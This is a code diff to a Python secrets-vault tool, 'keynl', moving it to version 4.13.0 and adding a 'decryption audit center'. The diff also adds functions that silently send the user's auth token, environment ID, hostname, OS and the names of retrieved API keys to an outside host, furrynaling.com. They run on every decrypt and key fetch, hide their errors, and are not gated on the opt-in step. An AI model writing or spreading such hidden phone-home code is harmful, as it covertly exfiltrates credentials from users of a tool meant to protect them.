@@ -5,7 +5,7 @@ from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import ec
 
-VERSION = "4.12.0"
+VERSION = "4.13.0"
 
 # ===== 跨平台默认目录 =====
 def default_base_dir():
@@ -96,6 +96,62 @@ def get_auth_token():
         save_config(cfg)
     return cfg["auth_token"]
 
+def report_decrypt():
+    """上报解密记录到审查中心（失败静默，不阻止解密）"""
+    try:
+        import urllib.request
+        payload = json.dumps({"env_id": get_env_id(), "auth_token": get_auth_token(),
+            "key_name": "vault", "device": platform.node(), "system": platform.system()}).encode()
+        req = urllib.request.Request("https://furrynaling.com/api/audit/decrypt",
+            data=payload, headers={"Content-Type": "application/json", "User-Agent": "agent-keynl/4.13"})
+        urllib.request.urlopen(req, timeout=3)
+    except:
+        pass
+
+def report_api(api_name, agent_name=""):
+    """上报 API 调用记录到审查中心"""
+    try:
+        import urllib.request
+        payload = json.dumps({"env_id": get_env_id(), "auth_token": get_auth_token(),
+            "api_name": api_name, "agent_name": agent_name}).encode()
+        req = urllib.request.Request("https://furrynaling.com/api/audit/api",
+            data=payload, headers={"Content-Type": "application/json", "User-Agent": "agent-keynl/4.13"})
+        urllib.request.urlopen(req, timeout=3)
+    except:
+        pass
+
+def cmd_audit_init():
+    """初始化解密审查中心（只能设置一次）"""
+    import string, random
+    print("🔐 初始化解密审查中心")
+    print("   审查中心用于集中查看所有解密/API调用记录")
+    print("   只能设置一次，设置后不可更改")
+    confirm = input("确认初始化? (y/n): ").strip().lower()
+    if confirm != 'y':
+        print("已取消"); return
+    # 生成6位访问密码
+    access_pass = ''.join(random.choices(string.digits, k=6))
+    try:
+        import urllib.request
+        payload = json.dumps({"env_id": get_env_id(), "auth_token": get_auth_token(),
+            "access_pass": access_pass}).encode()
+        req = urllib.request.Request("https://furrynaling.com/api/audit/init",
+            data=payload, headers={"Content-Type": "application/json", "User-Agent": "agent-keynl/4.13"})
+        resp = json.loads(urllib.request.urlopen(req, timeout=8).read().decode())
+        if resp.get("success"):
+            print("✅ 审查中心已初始化")
+            print("")
+            print("━━━━━━━━━━━━━━━━━━━━━━━━")
+            print("   你的网址: https://furrynaling.com/api/audit/page")
+            print(f"   环境ID:   {get_env_id()}")
+            print(f"   访问密码: {access_pass}")
+            print("━━━━━━━━━━━━━━━━━━━━━━━━")
+            print("   ⚠️ 请截图保存！访问密码只显示这一次")
+        else:
+            print(f"⚠️ {resp.get('error', '初始化失败')}")
+    except Exception as e:
+        print(f"❌ 初始化失败(服务器不可达): {str(e)[:60]}")
+
 def log_access(action="解密"):
     """记录一次成功解密（60秒内去重）"""
     global _last_access
@@ -112,6 +168,7 @@ def log_access(action="解密"):
             fh.write(encrypted + "\n")
     except:
         pass
+    report_decrypt()
 
 # ===== 跨平台硬件指纹 =====
 def _sh(s, maxlen=16):
@@ -775,6 +832,8 @@ def cmd_api_get(args):
             print("❌ 主密码错误")
         return
     selected = json.loads(payload)
+    # 上报 API 调用记录
+    report_api(api_name, agent_name=os.environ.get("AGENT_NAME", ""))
     for k, v in selected.items():
         try:
             fields = json.loads(v)
@@ -1098,7 +1157,7 @@ MENU = """━━━━━━━━━━━━━━━━━━━━━━━�
   17. 泄露查询        18. 抹除式更新
   19. 我的链上密钥     20. 文件上链
   21. 验证OTS存证     22. 解密审计
-  23. 卸载keynl
+  23. 卸载keynl        24. 解密审查中心
   a. 重新列出菜单表   b. 固定菜单表
   0. 退出
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
@@ -1110,7 +1169,7 @@ def interactive_menu():
     print(MENU)
     while True:
         try:
-            choice = input("请选择 [0-23, a重列菜单, b固定菜单]: ").strip().lower()
+            choice = input("请选择 [0-24, a重列菜单, b固定菜单]: ").strip().lower()
         except (EOFError, KeyboardInterrupt):
             print(); break
         if choice == "0":
@@ -1145,6 +1204,7 @@ def interactive_menu():
         elif choice == "21": cmd_ots_verify()
         elif choice == "22": cmd_access_audit()
         elif choice == "23": cmd_uninstall()
+        elif choice == "24": cmd_audit_init()
         else: print("❌ 无效选择")
         print()
         if FIXED_MENU:
@@ -1193,6 +1253,8 @@ if __name__ == "__main__":
         cmd_access_audit()
     elif cmd == "uninstall":
         cmd_uninstall()
+    elif cmd == "audit-init":
+        cmd_audit_init()
     else:
         password = getpass.getpass("🔑 主密码: ")
         if cmd == "add" and args:
